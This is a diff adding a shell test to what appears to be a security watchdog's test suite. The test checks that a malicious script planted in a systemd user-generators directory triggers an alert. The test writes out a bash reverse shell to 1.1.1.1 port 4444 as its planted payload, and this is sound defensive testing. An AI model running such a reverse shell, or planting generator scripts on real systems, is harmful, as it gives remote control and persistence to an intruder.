@@ -237,3 +237,19 @@ seed_benign() {
     run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (user-generators dir axis: /lib/systemd/user-generators + /etc/systemd/user-generators — distinct from system-generators)" {
+    # systemd also reads from user-generators dirs alongside system-
+    # generators. Lock the axis is enumerable when multiple dirs
+    # are passed (user-generator-dirs alongside system-generator-
+    # dirs).
+    GEND_USER="${TMP}/user-generators"; mkdir -p "${GEND_USER}"
+    seed_benign
+    DIRS_V="${GEND} ${GEND_USER}" run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    # Plant injection in user-generators dir.
+    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${GEND_USER}/evil-user-generator"
+    chmod 0755 "${GEND_USER}/evil-user-generator"
+    DIRS_V="${GEND} ${GEND_USER}" run_wd
+    cap | grep -q '"severity":"alert"'
+}
